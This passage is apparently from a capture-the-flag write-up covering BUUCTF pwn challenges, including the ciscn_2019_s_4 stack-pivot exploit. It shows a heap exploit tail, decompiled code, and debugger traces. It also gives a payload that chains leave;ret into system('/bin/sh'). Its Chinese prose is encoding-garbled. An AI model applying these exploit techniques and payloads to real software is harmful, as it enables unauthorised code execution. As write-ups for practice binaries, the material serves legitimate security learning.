class="number">1</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>+ p64(<span class="number">0</span>)+p64(<span class="number">0x91</span>) + p64(magic-<span class="number">0x10</span>)+ p64(magic-<span class="number">0x10</span>)</span><br><span class="line">EditHeap(<span class="number">0</span>,<span class="number">0x30</span>,payload)</span><br><span class="line">CreateHeap(<span class="number">0x50</span>,<span class="string">&#x27;eeee&#x27;</span>*<span class="number">0x1</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;:&#x27;</span>,<span class="string">&#x27;4869&#x27;</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="0x3A-ciscn-2019-s-4"><a href="#0x3A-ciscn-2019-s-4" class="headerlink" title="0x3A.ciscn_2019_s_4"></a>0x3A.ciscn_2019_s_4</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">gwt@ubuntu:~/Desktop$ checksec ciscn_s_4 </span><br><span class="line">[*] &#x27;/home/gwt/Desktop/ciscn_s_4&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">gwt@ubuntu:~/Desktop$ </span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  init();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome, my friend. What&#x27;s your name?&quot;</span>);</span><br><span class="line">  vul();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">vul</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">40</span>]; <span class="comment">// [esp+0h] [ebp-28h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x20</span>u);</span><br><span class="line">  read(<span class="number">0</span>, s, <span class="number">0x30</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Hello, %s\n&quot;</span>, s);</span><br><span class="line">  read(<span class="number">0</span>, s, <span class="number">0x30</span>u);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;Hello, %s\n&quot;</span>, s);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//è¿˜æœ‰ä¸ªåé—¨å‡½æ•°</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">hack</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;echo flag&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é¢˜è¾“å…¥çš„å®šé•¿åªæœ‰0x30ï¼Œåªèƒ½æº¢å‡º8å­—èŠ‚ï¼Œæ‰€ä»¥ä¸èƒ½ret2libcã€‚</p><p>vulnæ˜¯ä»¥leave retç»“å°¾çš„</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">.text:08048595</span><br><span class="line">.text:08048595 ; __unwind &#123;</span><br><span class="line">.text:08048595                 push    ebp</span><br><span class="line">.text:08048596                 mov     ebp, esp</span><br><span class="line">.text:08048598                 sub     esp, 28h</span><br><span class="line">.text:0804859B                 sub     esp, 4</span><br><span class="line">.text:0804859E                 push    20h ; &#x27; &#x27;       ; n</span><br><span class="line">.text:080485A0                 push    0               ; c</span><br><span class="line">.text:080485A2                 lea     eax, [ebp+s]</span><br><span class="line">.text:080485A5                 push    eax             ; s</span><br><span class="line">.text:080485A6                 call    _memset</span><br><span class="line">.text:080485AB                 add     esp, 10h</span><br><span class="line">.text:080485AE                 sub     esp, 4</span><br><span class="line">.text:080485B1                 push    30h ; &#x27;0&#x27;       ; nbytes</span><br><span class="line">.text:080485B3                 lea     eax, [ebp+s]</span><br><span class="line">.text:080485B6                 push    eax             ; buf</span><br><span class="line">.text:080485B7                 push    0               ; fd</span><br><span class="line">.text:080485B9                 call    _read</span><br><span class="line">.text:080485BE                 add     esp, 10h</span><br><span class="line">.text:080485C1                 sub     esp, 8</span><br><span class="line">.text:080485C4                 lea     eax, [ebp+s]</span><br><span class="line">.text:080485C7                 push    eax</span><br><span class="line">.text:080485C8                 push    offset format   ; &quot;Hello, %s\n&quot;</span><br><span class="line">.text:080485CD                 call    _printf</span><br><span class="line">.text:080485D2                 add     esp, 10h</span><br><span class="line">.text:080485D5                 sub     esp, 4</span><br><span class="line">.text:080485D8                 push    30h ; &#x27;0&#x27;       ; nbytes</span><br><span class="line">.text:080485DA                 lea     eax, [ebp+s]</span><br><span class="line">.text:080485DD                 push    eax             ; buf</span><br><span class="line">.text:080485DE                 push    0               ; fd</span><br><span class="line">.text:080485E0                 call    _read</span><br><span class="line">.text:080485E5                 add     esp, 10h</span><br><span class="line">.text:080485E8                 sub     esp, 8</span><br><span class="line">.text:080485EB                 lea     eax, [ebp+s]</span><br><span class="line">.text:080485EE                 push    eax</span><br><span class="line">.text:080485EF                 push    offset format   ; &quot;Hello, %s\n&quot;</span><br><span class="line">.text:080485F4                 call    _printf</span><br><span class="line">.text:080485F9                 add     esp, 10h</span><br><span class="line">.text:080485FC                 nop</span><br><span class="line">.text:080485FD                 leave</span><br><span class="line">.text:080485FE                 retn</span><br><span class="line">.text:080485FE ; &#125; // starts at 8048595</span><br><span class="line">.text:080485FE vul             endp</span><br></pre></td></tr></table></figure><p>å¯ä»¥è¿›è¡Œæ ˆè¿ç§»ã€‚</p><blockquote><p>  å‡è®¾esp =&gt; 0x1111,ebp=&gt;0x2222</p><p>  é‚£ä¹ˆleaveï¼š</p><blockquote><p>  mov esp,ebp; // esp = ebp = 0x2222</p><p>  pop ebp ;// ebp = [esp]ï¼Œesp = esp+4</p></blockquote></blockquote><p>è¾“å…¥0x20ä¸ªaæŸ¥çœ‹æ ˆ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; stack 30</span><br><span class="line">00:0000â”‚ esp  0xffffd048 â€”â–¸ 0xffffd098 â€”â–¸ 0xffffd0a8 â—‚â€” 0x0</span><br><span class="line">01:0004â”‚      0xffffd04c â—‚â€” 0x30 /* <span class="string">&#x27;0&#x27;</span> */</span><br><span class="line">02:0008â”‚      0xffffd050 â€”â–¸ 0xffffd070 â—‚â€” 0x61616161 (<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">03:000câ”‚      0xffffd054 â€”â–¸ 0xf7ed9c43 (__read_nocancel+25) â—‚â€” pop    ebx</span><br><span class="line">04:0010â”‚      0xffffd058 â—‚â€” 0x0</span><br><span class="line">05:0014â”‚      0xffffd05c â€”â–¸ 0x80485e5 (vul+80) â—‚â€” add    esp, 0x10</span><br><span class="line">06:0018â”‚      0xffffd060 â—‚â€” 0x0</span><br><span class="line">07:001câ”‚      0xffffd064 â€”â–¸ 0xffffd070 â—‚â€” 0x61616161 (<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">08:0020â”‚      0xffffd068 â—‚â€” 0x30 /* <span class="string">&#x27;0&#x27;</span> */</span><br><span class="line">09:0024â”‚      0xffffd06c â€”â–¸ 0xf7fb7d60 (_IO_2_1_stdout_) â—‚â€” 0xfbad2887</span><br><span class="line">0a:0028â”‚ ecx  0xffffd070 â—‚â€” 0x61616161 (<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">... â†“</span><br><span class="line">12:0048â”‚      0xffffd090 â€”â–¸ 0x80486d8 â—‚â€” push   edi</span><br><span class="line">13:004câ”‚      0xffffd094 â€”â–¸ 0xffffd154 â€”â–¸ 0xffffd327 â—‚â€” <span class="string">&#x27;./ciscn_s_4&#x27;</span></span><br><span class="line">14:0050â”‚ ebp  0xffffd098 â€”â–¸ 0xffffd0a8 â—‚â€” 0x0</span><br><span class="line">15:0054â”‚      0xffffd09c â€”â–¸ 0x804862a (main+43) â—‚â€” mov    eax, 0</span><br><span class="line">16:0058â”‚      0xffffd0a0 â€”â–¸ 0xf7fb73dc (__exit_funcs) â€”â–¸ 0xf7fb81e0 (initial) â—‚â€” 0x0</span><br><span class="line">17:005câ”‚      0xffffd0a4 â€”â–¸ 0xffffd0c0 â—‚â€” 0x1</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ebpçš„åœ°å€æ˜¯0xffffd0a8ï¼Œè¾“å…¥çš„bufçš„åœ°å€æ˜¯0xffffd070ï¼Œç›¸å·®0x38.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x28</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x28</span>)</span><br><span class="line">ebp = u32(io.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(ebp)</span><br></pre></td></tr></table></figure><p>ç¬¬äºŒæ¬¡æ„é€ çš„payloadæ˜¯è¿™æ ·ï¼š</p><p><code>payload=(p32(sys_addr)+&#39;aaaa&#39;+p32(buf+12)+&#39;/bin/sh\x00&#39;).ljust(0x28,&#39;a&#39;)+p32(buf_addr-4)+p32(leave)</code></p><p>å‰é¢çš„0x28æ˜¯ç”¨æ¥å¡«å……ï¼Œ<code>buf_addr</code>æ˜¯è¦†å†™ebpçš„åœ°å€ï¼Œleaveè¦†å†™retçš„åœ°å€ã€‚</p><p>æ‰€æœ‰çš„æµç¨‹å¦‚ä¸‹ï¼š</p><p><img src="/2021/07/18/BUU-PWN-0x30-0x3f/1.png" alt="1"></p><p>å…·ä½“çš„è°ƒè¯•æƒ…å†µå¦‚ä¸‹ï¼š</p><p>æ‰§è¡Œæºç¨‹åºä¸­çš„leaveå‰ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">EAX  0x8</span><br><span class="line"> EBX  0x0</span><br><span class="line"> ECX  0xffffffff</span><br><span class="line"> EDX  0xf7fb8870 (_IO_stdfile_1_lock) â—‚â€” 0x0</span><br><span class="line"> EDI  0xf7fb7000 (_GLOBAL_OFFSET_TABLE_) â—‚â€” 0x1b2db0</span><br><span class="line"> ESI  0xf7fb7000 (_GLOBAL_OFFSET_TABLE_) â—‚â€” 0x1b2db0</span><br><span class="line"> EBP  0xffffd098 â€”â–¸ 0xffffd06c â€”â–¸ 0xf7fb7d60 (_IO_2_1_stdout_) â—‚â€” 0xfbad2887</span><br><span class="line"> ESP  0xffffd070 â€”â–¸ 0x8048400 (system@plt) â—‚â€” jmp    dword ptr [0x804a018]</span><br><span class="line"> EIP  0x80485fd (vul+104) â—‚â€” leave  </span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ DISASM ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line">   0x80485ee &lt;vul+89&gt;                     push   eax</span><br><span class="line">   0x80485ef &lt;vul+90&gt;                     push   0x80486ca</span><br><span class="line">   0x80485f4 &lt;vul+95&gt;                     call   <span class="built_in">printf</span>@plt &lt;0x80483e0&gt;</span><br><span class="line"> </span><br><span class="line">   0x80485f9 &lt;vul+100&gt;                    add    esp, 0x10</span><br><span class="line">   0x80485fc &lt;vul+103&gt;                    nop    </span><br><span class="line"> â–º 0x80485fd &lt;vul+104&gt;                    leave  </span><br><span class="line">   0x80485fe &lt;vul+105&gt;                    ret    </span><br><span class="line">    â†“</span><br><span class="line">   0x80484b8 &lt;deregister_tm_clones+40&gt;    leave  </span><br><span class="line">   0x80484b9 &lt;deregister_tm_clones+41&gt;    ret    </span><br><span class="line">    â†“</span><br><span class="line">   0x8048400 &lt;system@plt&gt;                 jmp    dword ptr [_GLOBAL_OFFSET_TABLE_+24] &lt;0x804a018&gt;</span><br><span class="line"> </span><br><span class="line">   0x8048406 &lt;system@plt+6&gt;               push   0x18</span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ STACK ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line">00:0000â”‚ esp  0xffffd070 â€”â–¸ 0x8048400 (system@plt) â—‚â€” jmp    dword ptr [0x804a018]</span><br><span class="line">01:0004â”‚      0xffffd074 â—‚â€” 0x61616161 (<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">02:0008â”‚      0xffffd078 â€”â–¸ 0xffffd07c â—‚â€” <span class="string">&#x27;/bin/sh&#x27;</span></span><br><span class="line">03:000câ”‚      0xffffd07c â—‚â€” <span class="string">&#x27;/bin/sh&#x27;</span></span><br><span class="line">04:0010â”‚      0xffffd080 â—‚â€” 0x68732f /* <span class="string">&#x27;/sh&#x27;</span> */</span><br><span class="line">05:0014â”‚      0xffffd084 â—‚â€” 0x61616161 (<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æ‰§è¡Œæºç¨‹åºä¸­çš„leaveåï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"> EAX  0x8</span><br><span class="line"> EBX  0x0</span><br><span class="line"> ECX  0xffffffff</span><br><span class="line"> EDX  0xf7fb8870 (_IO_stdfile_1_lock) â—‚â€” 0x0</span><br><span class="line"> EDI  0xf7fb7000 (_GLOBAL_OFFSET_TABLE_) â—‚â€” 0x1b2db0</span><br><span class="line"> ESI  0xf7fb7000 (_GLOBAL_OFFSET_TABLE_) â—‚â€” 0x1b2db0</span><br><span class="line"> EBP  0xffffd06c â€”â–¸ 0xf7fb7d60 (_IO_2_1_stdout_) â—‚â€” 0xfbad2887</span><br><span class="line"> ESP  0xffffd09c â€”â–¸ 0x80484b8 (deregister_tm_clones+40) â—‚â€” leave  </span><br><span class="line"> EIP  0x80485fe (vul+105) â—‚â€” ret    </span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ DISASM ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line">   0x80485ef &lt;vul+90&gt;                     push   0x80486ca</span><br><span class="line">   0x80485f4 &lt;vul+95&gt;                     call   printf@plt &lt;0x80483e0&gt;</span><br><span class="line"> </span><br><span class="line">   0x80485f9 &lt;vul+100&gt;                    add    esp, 0x10</span><br><span class="line">   0x80485fc &lt;vul+103&gt;                    nop    </span><br><span class="line">   0x80485fd &lt;vul+104&gt;                    leave  </span><br><span class="line"> â–º 0x80485fe &lt;vul+105&gt;                    ret             &lt;0x80484b8; deregister_tm_clones+40&gt;</span><br><span class="line">    â†“</span><br><span class="line">   0x80484b8 &lt;deregister_tm_clones+40&gt;    leave  </span><br><span class="line">   0x80484b9 &lt;deregister_tm_clones+41&gt;    ret    </span><br><span class="line">    â†“</span><br><span class="line">   0x8048400 &lt;system@plt&gt;                 jmp    dword ptr [_GLOBAL_OFFSET_TABLE_+24] &lt;0x804a018&gt;</span><br><span class="line"> </span><br><span class="line">   0x8048406 &lt;system@plt+6&gt;               push   0x18</span><br><span class="line">   0x804840b &lt;system@plt+11&gt;              jmp    0x80483c0</span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ STACK ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line">00:0000â”‚ esp  0xffffd09c â€”â–¸ 0x80484b8 (deregister_tm_clones+40) â—‚â€” leave  </span><br><span class="line">01:0004â”‚      0xffffd0a0 â€”â–¸ 0xf7fb73dc (__exit_funcs) â€”â–¸ 0xf7fb81e0 (initial) â—‚â€” 0x0</span><br><span class="line">02:0008â”‚      0xffffd0a4 â€”â–¸ 0xffffd0c0 â—‚â€” 0x1</span><br><span class="line">03:000câ”‚      0xffffd0a8 â—‚â€” 0x0</span><br><span class="line">04:0010â”‚      0xffffd0ac â€”â–¸ 0xf7e1c647 (__libc_start_main+247) â—‚â€” add    esp, 0x10</span><br><span class="line">05:0014â”‚      0xffffd0b0 â€”â–¸ 0xf7fb7000 (_GLOBAL_OFFSET_TABLE_) â—‚â€” 0x1b2db0</span><br><span class="line">... â†“</span><br><span class="line">07:001câ”‚      0xffffd0b8 â—‚â€” 0x0</span><br></pre></td></tr></table></figure><p>æ‰§è¡Œå®Œæºç¨‹åºä¸­çš„retåï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"> EAX  0x8</span><br><span class="line"> EBX  0x0</span><br><span class="line"> ECX  0xffffffff</span><br><span class="line"> EDX  0xf7fb8870 (_IO_stdfile_1_lock) â—‚â€” 0x0</span><br><span class="line"> EDI  0xf7fb7000 (_GLOBAL_OFFSET_TABLE_) â—‚â€” 0x1b2db0</span><br><span class="line"> ESI  0xf7fb7000 (_GLOBAL_OFFSET_TABLE_) â—‚â€” 0x1b2db0</span><br><span class="line"> EBP  0xffffd06c â€”â–¸ 0xf7fb7d60 (_IO_2_1_stdout_) â—‚â€” 0xfbad2887</span><br><span class="line"> ESP  0xffffd0a0 â€”â–¸ 0xf7fb73dc (__exit_funcs) â€”â–¸ 0xf7fb81e0 (initial) â—‚â€” 0x0</span><br><span class="line"> EIP  0x80484b8 (deregister_tm_clones+40) â—‚â€” leave  </span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ DISASM ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line">   0x80485f4 &lt;vul+95&gt;                     call   printf@plt &lt;0x80483e0&gt;</span><br><span class="line"> </span><br><span class="line">   0x80485f9 &lt;vul+100&gt;                    add    esp, 0x10</span><br><span class="line">   0x80485fc &lt;vul+103&gt;                    nop    </span><br><span class="line">   0x80485fd &lt;vul+104&gt;                    leave  </span><br><span class="line">   0x80485fe &lt;vul+105&gt;                    ret    </span><br><span class="line">    â†“</span><br><span class="line"> â–º 0x80484b8 &lt;deregister_tm_clones+40&gt;    leave  </span><br><span class="line">   0x80484b9 &lt;deregister_tm_clones+41&gt;    ret    </span><br><span class="line">    â†“</span><br><span class="line">   0x8048400 &lt;system@plt&gt;                 jmp    dword ptr [_GLOBAL_OFFSET_TABLE_+24] &lt;0x804a018&gt;</span><br><span class="line"> </span><br><span class="line">   0x8048406 &lt;system@plt+6&gt;               push   0x18</span><br><span class="line">   0x804840b &lt;system@plt+11&gt;              jmp    0x80483c0</span><br><span class="line">    â†“</span><br><span class="line">   0x80483c0                              push   dword ptr [_GLOBAL_OFFSET_TABLE_+4] &lt;0x804a004&gt;</span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ STACK ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line">00:0000â”‚ esp  0xffffd0a0 â€”â–¸ 0xf7fb73dc (__exit_funcs) â€”â–¸ 0xf7fb81e0 (initial) â—‚â€” 0x0</span><br><span class="line">01:0004â”‚      0xffffd0a4 â€”â–¸ 0xffffd0c0 â—‚â€” 0x1</span><br><span class="line">02:0008â”‚      0xffffd0a8 â—‚â€” 0x0</span><br><span class="line">03:000câ”‚      0xffffd0ac â€”â–¸ 0xf7e1c647 (__libc_start_main+247) â—‚â€” add    esp, 0x10</span><br><span class="line">04:0010â”‚      0xffffd0b0 â€”â–¸ 0xf7fb7000 (_GLOBAL_OFFSET_TABLE_) â—‚â€” 0x1b2db0</span><br><span class="line">... â†“</span><br><span class="line">06:0018â”‚      0xffffd0b8 â—‚â€” 0x0</span><br><span class="line">07:001câ”‚      0xffffd0bc â€”â–¸ 0xf7e1c647 (__libc_start_main+247) â—‚â€” add    esp, 0x10</span><br></pre></td></tr></table></figure><p>æ‰§è¡Œå®Œæ„é€ payloadä¸­çš„leaveåï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"> EAX  0x8</span><br><span class="line"> EBX  0x0</span><br><span class="line"> ECX  0xffffffff</span><br><span class="line"> EDX  0xf7fb8870 (_IO_stdfile_1_lock) â—‚â€” 0x0</span><br><span class="line"> EDI  0xf7fb7000 (_GLOBAL_OFFSET_TABLE_) â—‚â€” 0x1b2db0</span><br><span class="line"> ESI  0xf7fb7000 (_GLOBAL_OFFSET_TABLE_) â—‚â€” 0x1b2db0</span><br><span class="line"> EBP  0xf7fb7d60 (_IO_2_1_stdout_) â—‚â€” 0xfbad2887</span><br><span class="line"> ESP  0xffffd070 â€”â–¸ 0x8048400 (system@plt) â—‚â€” jmp    dword ptr [0x804a018]</span><br><span class="line"> EIP  0x80484b9 (deregister_tm_clones+41) â—‚â€” ret    </span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ DISASM 